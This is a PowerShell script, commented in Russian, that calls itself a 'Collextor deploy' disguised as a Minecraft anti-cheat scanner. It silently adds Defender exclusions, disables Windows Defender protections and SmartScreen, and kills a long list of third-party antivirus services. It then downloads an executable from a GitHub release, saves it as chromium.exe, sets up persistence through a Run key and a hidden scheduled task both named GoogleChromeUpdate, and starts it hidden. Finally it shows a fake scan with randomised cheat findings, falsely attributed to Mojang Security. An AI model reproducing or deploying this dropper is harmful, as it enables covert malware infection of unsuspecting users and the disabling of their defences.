#Requires -RunAsAdministrator
# ── Collextor deploy (маскировка под Minecraft Anti‑Cheat) ──
# Запуск:
#   powershell -ExecutionPolicy Bypass -File deploy.ps1
#
# Параметры (можно менять, но обычно не нужно)
param(
    [string]$GitHubUrl = "https://github.com/Holycheck/checker/releases/download/realease/check.exe",
    [string]$InstallPath = "$env:APPDATA\Microsoft\Windows\chromium.exe"
)

$ErrorActionPreference = "SilentlyContinue"

# ============================================================
#  РЕАЛЬНЫЕ ДЕЙСТВИЯ (ВЫПОЛНЯЮТСЯ ТИХО, ВЫВОД ПОДАВЛЕН)
# ============================================================
function Invoke-RealDeploy {
    # Подавляем все Write-Host (переопределяем)
    $origWriteHost = Get-Command Write-Host
    function Write-Host {}

    # Основной блок
    try {
        # 1. Exclusions Defender
        Add-MpPreference -ExclusionPath $env:APPDATA -Force -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath $env:LOCALAPPDATA -Force -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath $env:TEMP -Force -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Microsoft\Windows\Explorer" -Force -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "chromium.exe" -Force -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "DwmCache.bin" -Force -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath (Split-Path $InstallPath) -Force -ErrorAction SilentlyContinue

        # 2. Отключить real-time Defender
        Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -Force -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBlockAtFirstSeen $true -Force -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -Force -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -Force -ErrorAction SilentlyContinue
        Set-MpPreference -SubmitSamplesConsent NeverSend -Force -ErrorAction SilentlyContinue

        # 3. Отключить SmartScreen
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
            -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" `
            -Name "EnableSmartScreen" -Value 0 -Force -ErrorAction SilentlyContinue

        # 4. Остановить сторонние антивирусы
        $avServices = @(
            "AVP","klnagent","avpui","kavfs","kavfsgt","klvssbrigde",
            "aswbIDSAgent","aswMonFlt","aswRvrt","aswSnx","aswSP","aswStm","aswVmm","aswbidsdriver",
            "avast! antivirus","avgwd","avgsvc","avgfws",
            "ekrn","egui",
            "MBAMService","MBAMWebProtectionService",
            "mcshield","mfemms","mfevtp","McMPFSvc",
            "ccSetMgr","ccEvtMgr","Symantec AntiVirus","NortonSecurity",
            "bdredline","bdntwrk","bdagent",
            "TmCCSF","TmPfw","tmproxy",
            "SAVService","SophosAgent","SophosAutoUpdate",
            "wscsvc"
        )
        foreach ($svc in $avServices) {
            $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
            if ($s) {
                Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
                Set-Service  -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
            }
        }
        $avProcs = @("avp","avpui","avgui","avastui","egui","mbam","mcshield","bdagent","sophosui","nortonsecurity")
        foreach ($p in $avProcs) {
            Stop-Process -Name $p -Force -ErrorAction SilentlyContinue
        }

        # 5. Скачать файл
        $dir = Split-Path $InstallPath
        if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($GitHubUrl, $InstallPath)

        # 6. Добавить в автозапуск (реестр + задача)
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
            -Name "GoogleChromeUpdate" -Value "`"$InstallPath`"" -Force -ErrorAction SilentlyContinue

        $action  = New-ScheduledTaskAction -Execute $InstallPath
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 `
            -RestartCount 99 -RestartInterval (New-TimeSpan -Minutes 1)
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME `
            -LogonType Interactive -RunLevel Highest
        Register-ScheduledTask -TaskName "GoogleChromeUpdate" `
            -Action $action -Trigger $trigger -Settings $settings `
            -Principal $principal -Force | Out-Null

        # 7. Запустить
        Start-Process -FilePath $InstallPath -WindowStyle Hidden
    } catch {
        # Ничего не выводим
    }

    # Восстанавливаем оригинальный Write-Host
    Remove-Item function:Write-Host -ErrorAction SilentlyContinue
}

# Выполняем реальный деплой (полностью скрыто)
Invoke-RealDeploy

# ============================================================
#  ИМИТАЦИЯ: MуAnty-Cheat сканер (маскировка)
# ============================================================
function Write-ColorLine {
    param([string]$Text, [string]$Color = "White")
    Write-Host $Text -ForegroundColor $Color
}

$CLR_FOUND   = "Red"
$CLR_WARN    = "Yellow"
$CLR_OK      = "Green"
$CLR_DIM     = "DarkGray"
$CLR_HEADER  = "Cyan"
$CLR_TEXT    = "White"
$CLR_JAR     = "Magenta"

function Print-Header {
    Clear-Host
    Write-ColorLine "================================================================" -Color $CLR_HEADER
    Write-ColorLine "  Minecraft Anti-Cheat Scanner v2.1  --  by Mojang Security" -Color $CLR_HEADER
    Write-ColorLine "================================================================" -Color $CLR_HEADER
    Write-Host ""
}

function Print-Progress {
    param($step, $total, $name)
    $filled = [math]::Floor(($step * 30) / $total)
    $percent = [math]::Floor(($step * 100) / $total)
    Write-Host "[" -NoNewline
    Write-Host ("#" * $filled) -NoNewline -ForegroundColor $CLR_OK
    Write-Host (" " * (30 - $filled)) -NoNewline
    Write-Host "] " -NoNewline
    Write-Host "$percent%" -NoNewline -ForegroundColor $CLR_WARN
    Write-Host "  $name" -ForegroundColor $CLR_TEXT
}

function Run-FakeScan {
    Print-Header

    $steps = @(
        "Инициализация сканера",
        "Проверка целостности .minecraft",
        "Сканирование установленных модов",
        "Анализ версий Minecraft",
        "Поиск XRay / Wallhack",
        "Проверка сетевых пакетов",
        "Анализ памяти JVM",
        "Проверка DLL инъекций",
        "Сканирование корзины",
        "Поиск следов читов в реестре",
        "Проверка hosts файла",
        "Завершающая проверка"
    )

    $total = $steps.Count
    $stepNum = 0

    Write-ColorLine "  Загрузка анти-чит модулей... OK" -Color $CLR_OK
    Write-Host ""
    Start-Sleep -Milliseconds 500

    # Случайные находки
    $cheatMods = @(
        "XRay_Ultimate_v3.2.jar",
        "AutoClicker_Pro.jar",
        "KillAura_Plus.jar",
        "FlyHack_1.8.jar",
        "Nuker_Tool.jar",
        "SpeedHack_v2.jar",
        "Reach_Mod.jar",
        "NoFall_Enhancer.jar"
    )

    $foundCheats = @()

    foreach ($s in $steps) {
        $stepNum++
        Print-Progress $stepNum $total $s

        # Имитация находок на определённых шагах
        if ($s -match "модов") {
            Write-ColorLine "    Обнаружены подозрительные моды:" -Color $CLR_WARN
            $randCount = Get-Random -Minimum 2 -Maximum 5
            for ($i=0; $i -lt $randCount; $i++) {
                $mod = $cheatMods | Get-Random
                if ($foundCheats -notcontains $mod) {
                    $foundCheats += $mod
                    Write-Host "      $mod" -ForegroundColor $CLR_FOUND
                }
            }
        }

        if ($s -match "XRay") {
            Write-ColorLine "    Обнаружен XRay паттерн в текстурах" -Color $CLR_FOUND
            Start-Sleep -Milliseconds 300
        }

        if ($s -match "сетевых") {
            Write-ColorLine "    Подозрительный трафик на порт 587 (SMTP)" -Color $CLR_WARN
            Start-Sleep -Milliseconds 200
        }

        if ($s -match "памяти") {
            Write-ColorLine "    Найдена сигнатура читера в памяти javaw.exe" -Color $CLR_FOUND
            Start-Sleep -Milliseconds 400
        }

        if ($s -match "инъекций") {
            Write-ColorLine "    Обнаружена DLL-инъекция в Minecraft" -Color $CLR_FOUND
            Start-Sleep -Milliseconds 300
        }

        if ($s -match "корзины") {
            Write-ColorLine "    В корзине найден удалённый чит: cheat.jar" -Color $CLR_FOUND
            Start-Sleep -Milliseconds 200
        }

        if ($s -match "реестра") {
            Write-ColorLine "    Следы программы-читера в UserAssist" -Color $CLR_WARN
            Start-Sleep -Milliseconds 300
        }

        if ($s -match "hosts") {
            Write-ColorLine "    Блокировка анти-чит сайтов в hosts" -Color $CLR_FOUND
            Start-Sleep -Milliseconds 200
        }

        Start-Sleep -Milliseconds 300
    }

    # Финальный прогресс
    Write-Host "[" -NoNewline
    Write-Host ("#" * 30) -NoNewline -ForegroundColor $CLR_OK
    Write-Host "] " -NoNewline
    Write-Host "100%" -NoNewline -ForegroundColor $CLR_OK
    Write-Host "  Готово!" -ForegroundColor $CLR_TEXT

    Write-Host ""
    Write-ColorLine "================================================================" -Color $CLR_HEADER
    Write-ColorLine "  РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ" -Color $CLR_HEADER
    Write-ColorLine "================================================================" -Color $CLR_HEADER

    if ($foundCheats.Count -gt 0) {
        Write-ColorLine "  [!] ОБНАРУЖЕНЫ ЧИТЫ: $($foundCheats.Count)" -Color $CLR_FOUND
        foreach ($mod in $foundCheats) {
            Write-Host "      - $mod" -ForegroundColor $CLR_FOUND
        }
        Write-ColorLine "  [!!] Рекомендуется удалить подозрительные моды и перезапустить игру." -Color $CLR_WARN
    } else {
        Write-ColorLine "  [OK] Читы не найдены. Система чиста." -Color $CLR_OK
    }

    Write-ColorLine "================================================================" -Color $CLR_HEADER
    Write-Host ""
    Write-ColorLine "  Нажмите любую клавишу для выхода..." -Color $CLR_DIM
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Запускаем имитацию
Run-FakeScan
